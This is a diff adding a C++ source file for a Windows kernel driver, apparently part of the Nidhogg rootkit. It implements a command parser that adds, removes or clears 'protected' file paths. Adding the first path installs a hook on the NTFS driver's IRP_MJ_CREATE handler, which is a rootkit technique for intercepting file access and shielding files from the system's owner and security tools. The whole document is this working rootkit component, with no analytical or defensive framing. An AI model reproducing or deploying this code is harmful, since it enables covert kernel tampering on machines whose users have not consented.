@@ -1,0 +1,110 @@
+#include "pch.h"
+#include "FileParser.h"
+#include "FileUtils.hpp"
+
+FileParser::FileParser() {
+	this->optionsSize = 3;
+	this->options = (OptionMetadata*)AllocateMemory(this->optionsSize * sizeof(OptionMetadata));
+
+	if (!this->options)
+		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
+
+	this->options[0] = { Options::Add, { 1, { ArgType::WCharPtr } } };
+	this->options[1] = { Options::Remove, { 1, { ArgType::WCharPtr } } };
+	this->options[2] = { Options::Clear, {} };
+}
+
+/*
+* Description:
+* Execute is responsible for executing a command and returning its value.
+*
+* Parameters:
+* @commandId [Options]  -- Command to run.
+* @args		 [PVOID*]	-- Array of args to send to the command.
+*
+* Returns:
+* @status	 [NTSTATUS] -- Result of the command.
+*/
+NTSTATUS FileParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
+	UNICODE_STRING wFileName = { 0 };
+	ProtectedFile protectedFile{};
+	NTSTATUS status = STATUS_SUCCESS;
+
+	if (args[0]) {
+		if (strlen((PCHAR)args[0]) > MAX_PATH)
+			return STATUS_INVALID_BUFFER_SIZE;
+
+		ANSI_STRING aFileName = { 0 };
+
+		// Converting string to unicode.
+		RtlInitAnsiString(&aFileName, (PCHAR)args[0]);
+		status = RtlAnsiStringToUnicodeString(&wFileName, &aFileName, TRUE);
+
+		if (!NT_SUCCESS(status))
+			return status;
+
+		protectedFile.FilePath = wFileName.Buffer;
+	}
+
+	switch (commandId) {
+	case Options::Add:
+	{
+		protectedFile.Protect = true;
+
+		if (NidhoggFileUtils->GetFilesCount() == MAX_FILES) {
+			status = STATUS_TOO_MANY_CONTEXT_IDS;
+			break;
+		}
+
+		if (!NidhoggFileUtils->FindFile(protectedFile.FilePath)) {
+			if (!NidhoggFileUtils->AddFile(protectedFile.FilePath)) {
+				status = STATUS_UNSUCCESSFUL;
+				break;
+			}
+
+			if (!NidhoggFileUtils->IsCallbackActivated(0)) {
+				status = NidhoggFileUtils->InstallNtfsHook(IRP_MJ_CREATE);
+
+				if (!NT_SUCCESS(status)) {
+					NidhoggFileUtils->RemoveFile(protectedFile.FilePath);
+					break;
+				}
+			}
+		}
+		break;
+	}
+	case Options::Remove:
+	{
+		protectedFile.Protect = false;
+
+		if (NidhoggFileUtils->GetFilesCount() == 0) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		if (!NidhoggFileUtils->RemoveFile(protectedFile.FilePath)) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+
+		if (NidhoggFileUtils->GetFilesCount() == 0)
+			status = NidhoggFileUtils->UninstallNtfsHook(IRP_MJ_CREATE);
+		break;
+	}
+	case Options::Clear:
+	{
+		NidhoggFileUtils->ClearFilesList();
+		break;
+	}
+	default:
+	{
+		status = STATUS_NOT_IMPLEMENTED;
+		break;
+	}
+	}
+
+	if (protectedFile.FilePath)
+		RtlFreeUnicodeString(&wFileName);
+
+	return status;
+}
